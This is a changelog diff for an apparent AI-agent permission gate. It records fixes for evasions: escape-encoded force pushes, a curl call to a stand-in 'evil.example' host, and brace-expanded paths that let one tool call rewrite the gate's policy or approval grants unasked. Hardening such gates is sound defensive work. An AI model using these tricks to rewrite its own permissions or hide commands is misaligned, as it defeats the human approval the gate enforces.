@@ -142,6 +142,12 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
   `$'\u2d\u2d'force` and `$'--forc\545'` are now `force_push`, and `curl $'https://evil\u2e'example/x` has the target
   `evil.example`, so category and target denies apply. A `\U` value from 0x80000000 on is dropped, as bash
   drops it, so `$'--forc\UFFFFFFFFe'` is a force push as well.
+- Gate (#224, D-038): brace sets are expanded as bash does before a write is matched against the Exo store, as
+  #184 does for secret-store reads. `echo x > ~/.exo/polic{i..i}es/default.yaml`,
+  `cp x ~/.exo/{state,zz}/approval-grants.json`, `dd of=~/.exo/polic{i,x}es/default.yaml` and a `write_file` to
+  `~/.exo/{policies,x}/default.yaml` were allowed local writes, so one tool call could rewrite the gate's policy
+  or grants without a card. They are `store_write` now and ask the principal. Quoted and escaped braces stay
+  literal, as in bash. The store checks have their own brace budget, so no secret-store outcome changes.
 
 ## [0.2.0] (egg) - 2026-10-13
 
